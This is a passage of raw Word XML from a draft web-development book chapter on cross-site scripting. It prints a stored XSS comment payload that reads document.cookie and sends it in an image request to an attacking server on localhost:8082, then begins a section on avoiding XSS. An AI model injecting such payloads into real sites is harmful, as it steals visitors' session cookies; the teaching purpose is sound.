    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00620AFB">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>The cookie</w:t>
      </w:r>
      <w:ins w:id="148" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="149" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="150" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> set, we can play the part of the hacker on the Comments page</w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t>, shown in figure 11.1</w:t>
      </w:r>
      <w:r w:rsidR="00E1282F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="3792220"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="3" name="Picture 2" descr="xss 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s before.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="3792220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C37697" w:rsidRDefault="00C37697" w:rsidP="00C37697">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Figure 11.1 The comments page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00C37697">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>We included a button that will automatically insert a malicious</w:t>
      </w:r>
      <w:ins w:id="151" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="006872B1">
        <w:rPr>
          <w:rPrChange w:id="152" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>malicious</w:instrText>
      </w:r>
      <w:ins w:id="153" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> comment in the Comment text area.</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> The comment appears in Listing 11.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.6 A malicious</w:t>
      </w:r>
      <w:ins w:id="154" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="006872B1">
        <w:rPr>
          <w:rPrChange w:id="155" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>malicious</w:instrText>
      </w:r>
      <w:ins w:id="156" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> comment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>A long comment &lt;script&gt;document.write('&lt;img src=http://localhost:8082/attack</w:t>
      </w:r>
      <w:ins w:id="157" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="158" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="159" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00E1282F">
        <w:t xml:space="preserve">/register?input=' </w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t xml:space="preserve">  #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>+escape(document.cookie</w:t>
      </w:r>
      <w:ins w:id="160" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="161" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="162" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00E1282F">
        <w:t>)+ '/&gt;')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00E1282F" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>This comment includes a script block.  The script block writes HTML to the browser.  The HTML contains an image whose SRC attribute</w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C37697" w:rsidRPr="00C37697">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is not an image at all, but the browser doesn't know that.  The browser sends a request to the attacking server with the cookie</w:t>
      </w:r>
      <w:ins w:id="163" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="164" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="165" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> in the query string. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After we save the comment, on the subsequent page where the comment is displayed, </w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t xml:space="preserve">shown in figure 11.2, </w:t>
      </w:r>
      <w:r>
        <w:t>the script is executed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="3792220"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="4" name="Picture 3" descr="xss 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s after.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="3792220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00C37697" w:rsidP="00C37697">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.2 The comment - unbeknownst to the visitor a nasty script is executed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>We can't see anything strange here, but the nefarious script</w:t>
      </w:r>
      <w:ins w:id="166" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="003D6B44">
        <w:rPr>
          <w:rPrChange w:id="167" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>nefarious script</w:instrText>
      </w:r>
      <w:ins w:id="168" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> is in the HTML source</w:t>
      </w:r>
      <w:r w:rsidR="00447B18">
        <w:t>, and the relevant section is shown in Listing 11.7</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Listing 11.7 Nefarious HTML </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>&lt;p&gt;Comment:&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>&lt;p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:tab/>
        <w:t>A long comment &lt;script&gt;document.write(</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      |#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:tab/>
        <w:t>'&lt;img src=http://localhost:8082/attack</w:t>
      </w:r>
      <w:ins w:id="169" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="170" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="171" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00E1282F">
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     |#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:tab/>
        <w:t>register?input=' +escape(document.cookie</w:t>
      </w:r>
      <w:ins w:id="172" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="173" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="174" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00E1282F">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   |#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:tab/>
        <w:t>+ '/&gt;')&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                            |#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Our nasty script</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Of course the browser dutifully responds</w:t>
      </w:r>
      <w:r w:rsidR="00980AE5">
        <w:t xml:space="preserve"> to this script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and sends the cookie</w:t>
      </w:r>
      <w:ins w:id="175" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="176" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="177" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> to the attacking site</w:t>
      </w:r>
      <w:r w:rsidR="00980AE5">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>When we reload the attacking site, we can see</w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t>, shown in figure 11.3,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r w:rsidR="00544692">
        <w:t>at our attack</w:t>
      </w:r>
      <w:ins w:id="178" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="179" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="180" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00544692">
        <w:t xml:space="preserve"> has been executed; the other site received our cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00980AE5" w:rsidRDefault="00544692" w:rsidP="00544692">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="1496060"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="1" name="Picture 0" descr="xss vi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s victory.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="1496060"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C37697" w:rsidRDefault="00C37697" w:rsidP="00C37697">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.3 Hacking success, the cookie</w:t>
      </w:r>
      <w:ins w:id="181" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="182" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="183" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> has been sent to the attacking site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00EA7892" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>Now that we've had a chance to see XSS</w:t>
      </w:r>
      <w:ins w:id="184" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="185" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="186" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> in action, let's work on securing our application against that vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1 Avoiding XSS</w:t>
      </w:r>
      <w:ins w:id="187" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="188" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="189" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> Vulnerabilities</w:t>
      </w:r>
      <w:ins w:id="190" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="00180160">
        <w:rPr>
          <w:rPrChange w:id="191" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Vulnerabilities</w:instrText>
      </w:r>
      <w:ins w:id="192" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EA7892" w:rsidRPr="00EA7892" w:rsidRDefault="00EA7892" w:rsidP="00EA7892">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Never trust input.  Never, ever, ever expect input to be safe.  Whether it</w:t>
      </w:r>
      <w:r w:rsidR="00DE1364">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00075153">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from a human user or a machine, dangerous input is the root attack</w:t>
      </w:r>
      <w:ins w:id="193" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="194" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="195" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> vector involved in XSS</w:t>
      </w:r>
      <w:ins w:id="196" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="197" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="198" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> attacks.  We don't trust it coming in, and we certainly don't trust it when we render it.  That's the key.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EA7892" w:rsidRDefault="003B62DA" w:rsidP="00EA7892">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1</w:t>
      </w:r>
      <w:r w:rsidR="00EA7892">
        <w:t>.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA7892">
        <w:t xml:space="preserve">Encode Everything </w:t>
      </w:r>
    </w:p>
